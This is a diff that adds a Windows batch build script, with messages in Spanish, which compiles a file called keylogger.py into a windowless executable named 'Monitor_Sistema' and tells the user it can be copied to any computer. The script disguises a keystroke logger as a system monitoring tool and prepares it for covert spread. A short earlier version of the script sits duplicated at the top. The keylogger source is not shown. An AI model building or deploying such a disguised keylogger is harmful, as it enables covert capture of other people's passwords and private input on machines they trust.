@@ -1,0 +1,46 @@
+@echo off
+pip install pyinstaller pynput
+pyinstaller --onefile --noconsole --name="Monitor_Sistema" --icon=icon.ico keylogger.py
+pause
+
+
+@echo off
+echo ============================================
+echo   Generando ejecutable Monitor_Sistema.exe
+echo ============================================
+echo.
+
+echo [1/3] Verificando instalaciones...
+python --version
+if errorlevel 1 (
+    echo ERROR: Python no esta instalado
+    pause
+    exit /b 1
+)
+
+echo.
+echo [2/3] Creando ejecutable...
+python -m PyInstaller --onefile --windowed --name="Monitor_Sistema" --icon=NONE keylogger.py
+
+if errorlevel 1 (
+    echo.
+    echo ERROR: Hubo un problema al crear el ejecutable
+    pause
+    exit /b 1
+)
+
+echo.
+echo [3/3] Limpiando archivos temporales...
+if exist build rmdir /s /q build
+if exist Monitor_Sistema.spec del /q Monitor_Sistema.spec
+
+echo.
+echo ============================================
+echo   COMPLETADO CON EXITO
+echo ============================================
+echo.
+echo El archivo Monitor_Sistema.exe esta en la carpeta: dist\
+echo.
+echo Puedes copiar este archivo a cualquier equipo.
+echo.
+pause
